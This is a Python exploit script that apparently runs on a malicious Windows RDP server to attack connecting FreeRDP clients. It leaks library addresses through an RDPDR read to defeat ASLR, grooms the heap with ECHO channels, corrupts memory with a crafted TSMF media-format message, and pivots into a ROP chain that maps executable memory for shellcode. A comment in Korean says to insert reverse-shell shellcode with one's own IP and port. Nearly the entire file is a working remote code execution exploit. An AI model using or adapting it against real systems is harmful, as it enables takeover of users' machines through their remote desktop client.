import struct
import ctypes
import ctypes.wintypes
from random import randbytes, randrange, randint
from pathlib import Path
from typing import Type
from time import sleep

def _set_function(dll: ctypes.WinDLL, name: str, argtypes: tuple[Type], ret: Type) -> callable:
    func: ctypes._FuncPtr = getattr(dll, name)
    func.argtypes = argtypes
    func.restype = ret
    return func

lib = ctypes.windll.wtsapi32
WTSOpenServerA = _set_function(lib, "WTSOpenServerA", (ctypes.wintypes.LPSTR,), ctypes.wintypes.HANDLE)
WTSCloseServer = _set_function(lib, "WTSCloseServer", (ctypes.wintypes.HANDLE,), None)
WTSVirtualChannelOpen = _set_function(lib, "WTSVirtualChannelOpen", (ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD, ctypes.wintypes.LPSTR), ctypes.wintypes.HANDLE)
WTSVirtualChannelOpenEx = _set_function(lib, "WTSVirtualChannelOpenEx", (ctypes.wintypes.DWORD, ctypes.wintypes.LPSTR, ctypes.wintypes.DWORD), ctypes.wintypes.HANDLE)
WTSVirtualChannelClose = _set_function(lib, "WTSVirtualChannelClose", (ctypes.wintypes.HANDLE, ), ctypes.wintypes.BOOL)
WTSVirtualChannelRead = _set_function(lib, "WTSVirtualChannelRead", (ctypes.wintypes.HANDLE, ctypes.wintypes.ULONG, ctypes.wintypes.PCHAR, ctypes.wintypes.ULONG, ctypes.wintypes.PULONG), ctypes.wintypes.BOOL)
WTSVirtualChannelWrite = _set_function(lib, "WTSVirtualChannelWrite", (ctypes.wintypes.HANDLE, ctypes.wintypes.PCHAR, ctypes.wintypes.ULONG, ctypes.wintypes.PULONG), ctypes.wintypes.BOOL)

def OpenServer(pServerName: str) -> ctypes.wintypes.HANDLE:
    return ctypes.wintypes.HANDLE(WTSOpenServerA(ctypes.wintypes.LPSTR(pServerName.encode())))

def CloseServer(hServer: ctypes.wintypes.HANDLE) -> None:
    WTSCloseServer(hServer)

def VirtualChannelOpen(hServer: ctypes.wintypes.HANDLE, pVirtualName: str) -> ctypes.wintypes.HANDLE:
    return WTSVirtualChannelOpen(hServer, ctypes.wintypes.DWORD(-1), ctypes.wintypes.LPSTR(pVirtualName.encode()))

def VirtualChannelOpenEx(pVirtualName: str, flags: int) -> ctypes.wintypes.HANDLE:
    return WTSVirtualChannelOpenEx(ctypes.wintypes.DWORD(-1), ctypes.wintypes.LPSTR(pVirtualName.encode()), ctypes.wintypes.DWORD(flags))

def VirtualChannelClose(hChannelHandle: ctypes.wintypes.HANDLE | bytes) -> bool:
    return bool(WTSVirtualChannelClose(ctypes.wintypes.HANDLE(hChannelHandle)))

def VirtualChannelWrite(hChannelHandle: ctypes.wintypes.HANDLE | bytes, Buffer: bytes, Length: int) -> tuple[bool, int]:
    pBytesWritten = ctypes.wintypes.ULONG(0)
    res = WTSVirtualChannelWrite(ctypes.wintypes.HANDLE(hChannelHandle), \
                                    ctypes.create_string_buffer(Buffer.ljust(Length, b'\x00')), \
                                    ctypes.wintypes.DWORD(Length), \
                                    ctypes.wintypes.PULONG(pBytesWritten) \
                                )
    return res, pBytesWritten.value

def VirtualChannelRead(hChannelHandle: ctypes.wintypes.HANDLE | bytes, TimeOut: int, BufferSize: int) -> tuple[bool, bytes, int]:
    pBytesRead = ctypes.wintypes.ULONG(0)
    Buffer = ctypes.create_string_buffer(BufferSize)
    res = WTSVirtualChannelRead(ctypes.wintypes.HANDLE(hChannelHandle), \
                                    ctypes.wintypes.DWORD(TimeOut), \
                                    ctypes.wintypes.PCHAR(Buffer), \
                                    ctypes.wintypes.ULONG(BufferSize), \
                                    ctypes.wintypes.PULONG(pBytesRead) \
                                )
    return res, Buffer[:pBytesRead.value]

def u8(in_bytes):
    assert len(in_bytes) == 1
    out_num = struct.unpack("<B", in_bytes)[0]
    return out_num

def u16(in_bytes):
    assert len(in_bytes) == 2
    out_num = struct.unpack("<H", in_bytes)[0]
    return out_num

def u32(in_bytes):
    assert len(in_bytes) == 4
    out_num = struct.unpack("<L", in_bytes)[0]
    return out_num

def u64(in_bytes):
    assert len(in_bytes) == 8
    out_num = struct.unpack("<Q", in_bytes)[0]
    return out_num

def p8(in_num):
    assert in_num >> 8 == 0
    out_bytes = struct.pack("<B", in_num)
    return out_bytes
    
def p16(in_num):
    assert in_num >> 16 == 0
    out_bytes = struct.pack("<H", in_num)
    return out_bytes

def p32(in_num):
    assert in_num >> 32 == 0
    out_bytes = struct.pack("<L", in_num)
    return out_bytes

def p64(in_num):
    assert in_num >> 64 == 0
    out_bytes = struct.pack("<Q", in_num)
    return out_bytes

while 1:
    hServer = OpenServer("localhost")
    hRDPDRChannel = VirtualChannelOpen(hServer, "RDPDR")
    if hRDPDRChannel is not None:
        break

# Server Create Drive Request 
packet = b''
packet += p16(0x4472) # RDPDR_CTYP_CORE
packet += p16(0x4952) # PAKID_CORE_DEVICE_IOREQUEST
packet += p32(0x1)    # DeviceId
packet += p32(0x0)    # FileId
packet += p32(0x1234)    # CompletionId
packet += p32(0x0)    # MajorFunction
packet += p32(0x0)    # MinorFunction
packet += p32(0x0)    # GENERIC_WRITE | GENERIC_READ
packet += p64(0x0)    # AllocationSize
packet += p32(0x0)    # FILE_ATTRIBUTE_NORMAL
packet += p32(0x0)    # FILE_SHARE_READ | FILE_SHARE_WRITE
packet += p32(0x0)    # FILE_OPEN
packet += p32(0x0)    # FILE_NO_INTERMEDIATE_BUFFERING
packet += p32(1)
packet += b'\x00\x00\x00\x00'

VirtualChannelWrite(hRDPDRChannel, packet, len(packet))

_, res = VirtualChannelRead(hRDPDRChannel, -1, 1500)

print("[+] deviceId: ", u32(res[4:8]))
print("[+] completionId: "+hex(u32(res[8:12])))
print("[+] IoStatus: "+hex(u32(res[12:16])))
print("[+] FileId: "+hex(u32(res[16:20])))

# Server Read Drive Request 
packet = b''
packet += p16(0x4472) # RDPDR_CTYP_CORE
packet += p16(0x4952) # PAKID_CORE_DEVICE_IOREQUEST
packet += p32(0x1)    # DeviceId
packet += p32(0x0)    # FileId
packet += p32(0x1234) # CompletionId
packet += p32(0x3)    # MajorFunction
packet += p32(0x0)    # MinorFunction
packet += p32(0x80)   # Length
packet += p64(0x0)    # Offset
packet += bytes(0x20) # Padding
VirtualChannelWrite(hRDPDRChannel, packet, len(packet))

_, res = VirtualChannelRead(hRDPDRChannel, -1, 1500)
print("[+] deviceId: ", u32(res[4:8]))
print("[+] completionId: "+hex(u32(res[8:12])))
print("[+] IoStatus: "+hex(u32(res[12:16])))

libfreerdp_client3 = u64(res[20+12*8:20+13*8]) - 0x508c0 # irp_complete
libc_base = libfreerdp_client3 - 0x751000
libasound = libfreerdp_client3 - 0x2954000

# gadgets
mov_rsp_rdx = libc_base + 0x000000000005a170
mov_rdi_rsp = libc_base + 0x0000000000169608
pop_rdi =  libc_base + 0x000000000002a3e5
pop_rsi =  libc_base + 0x000000000002be51
pop_rcx = libc_base +  0x000000000008c6bb
pop_r8 =  libc_base + 0x0000000000165b76
mov_r9_rsp_0x10_call_r13 =  libc_base + 0x00000000000d3a49
pop_r13 = libc_base + 0x0000000000041c4a
pop_rax = libc_base + 0x0000000000045eb0
pop_rbp = libc_base + 0x000000000002a2e0
pop_rdx_r12 = libc_base + 0x000000000011f497
pop4_ret = libc_base + 0x000000000002be4b
lea_rsi_rsp_0x8_call_rax = libc_base + 0x000000000007f85d
sub_esi = libc_base + 0x0000000000142b51

# function
system_got = libasound + 0x101b90
execve_got = libasound + 0x101d28
memcpy = libc_base + 0xc48f0
mmap = libc_base + 0x11ebc0

print("[+] libfreerdp-client3: "+hex(libfreerdp_client3))
print("[+] libc.so.6: "+hex(libc_base))

for i in range(10):
    print(f"[+] try to trigger vuln... (count: {i+1})")
    
    hECHOChannels = []
    for i in range(0x200):
        hChan = VirtualChannelOpenEx("ECHO", 1)
        hECHOChannels.append(hChan)
        
    for i in range(0, 0x200, 2):
        VirtualChannelClose(hECHOChannels[i])

    hTSMFChannel = VirtualChannelOpenEx('TSMF', 1)

    presentationId = randbytes(16)

    initPacket = b''
    initPacket += p32(0x40000000) # Header - InterfaceId
    initPacket += p32(0)          # Header - MessageId
    initPacket += p32(0x00000105) # Header - FunctionId
    initPacket += presentationId
    initPacket += p32(0)

    VirtualChannelWrite(hTSMFChannel, initPacket, len(initPacket))

    VIDEO = bytes([0x76, 0x69, 0x64, 0x73, 0x00, 0x00, 0x10, 0x00, 0x80, 0x00, 0x00, 0xAA, 0x00, 0x38, 0x9B, 0x71])
    AVC1 = bytes([0x41, 0x56, 0x43, 0x31, 0x00, 0x00, 0x10, 0x00, 0x80, 0x00, 0x00, 0xAA, 0x00, 0x38, 0x9B, 0x71])
    MPEG2 = bytes([0xE3, 0x80, 0x6D, 0xE0, 0x46, 0xDB, 0xCF, 0x11, 0xB4, 0xD1, 0x00, 0x80, 0x5F, 0x6C, 0xBB, 0xEA])

    pbFormat = bytes(72) + p32(40) + p32(1000) + p32(1000) + bytes(28)
    cbFormat = 8 + len(pbFormat)

    payload = b''
    payload += p32(0x40000000)  # Header - InterfaceId
    payload += p32(0)           # Header - MessageId
    payload += p32(0x00000102)  # Header - FunctionId
    payload += presentationId   # PresentationId
    payload += p32(0)           # StreamId
    payload += p32(0)           # numMediaType
    payload += VIDEO            # MajorTyoe
    payload += AVC1             # SubType
    payload += randbytes(12)    # bFixedSizeSamples || bTemporalCompression || SampleSize
    payload += MPEG2            # FormatType
    payload += p32(cbFormat+0x20)# cbFormat => calloc(1, 0x30) 
    payload += pbFormat         # pbFormat
    payload += bytes(0x14)
    payload += p8(0x0)
    payload += p8(0x0)
    payload += p8(0x0)
    payload += p8(0x6e)         # => memcpy(dist, src, 0x6e+2)
    payload += b'\x00' * 0x2d
    payload += p64(0x35)        #
    payload += p64(0)*5
    payload += p64(0x85)        # size of DVCMAN_CHANNEL
    payload += p64(mov_rsp_rdx) # stack pivoting

    VirtualChannelWrite(hTSMFChannel, payload, len(payload))
		
		# reverse shellcode (개인 ip 주소와 port를 넣어 만들어야 함)
    shellcode = b''

    rop = b''
    rop += p64(pop_rdi)
    rop += p64(0x41410000)
    rop += p64(pop_rsi)
    rop += p64(0x10000)
    rop += p64(pop_rdx_r12)
    rop += p64(7)
    rop += p64(0)
    rop += p64(pop_rcx)
    rop += p64(0x32)
    rop += p64(pop_r8)
    rop += p64(0xffffffff)
    rop += p64(pop_r13)
    rop += p64(pop4_ret)
    rop += p64(mov_r9_rsp_0x10_call_r13)
    rop += p64(0)
    rop += p64(0)
    rop += p64(0)
    rop += p64(mmap)   # mmap(0x41410000, 0x10000, 0x32, 7, -1, 0)
    rop += p64(pop_rdi)
    rop += p64(0x41410000)
    rop += p64(pop_rdx_r12)
    rop += p64(len(shellcode)+8)
    rop += p64(0)
    rop += p64(pop_rax)
    rop += p64(pop_rax)
    rop += p64(lea_rsi_rsp_0x8_call_rax)
    rop += p64(memcpy) # memcpy(0x41410000, shellcode_addr-8, len(shellcode)+8)
    rop += p64(0x41410000+8)
    rop += shellcode

    for i in range(1, 0x201, 2):
        VirtualChannelWrite(hECHOChannels[i], rop, len(rop))
        VirtualChannelClose(hECHOChannels[i])

VirtualChannelClose(hTSMFChannel)
VirtualChannelClose(hRDPDRChannel)

CloseServer(hServer)
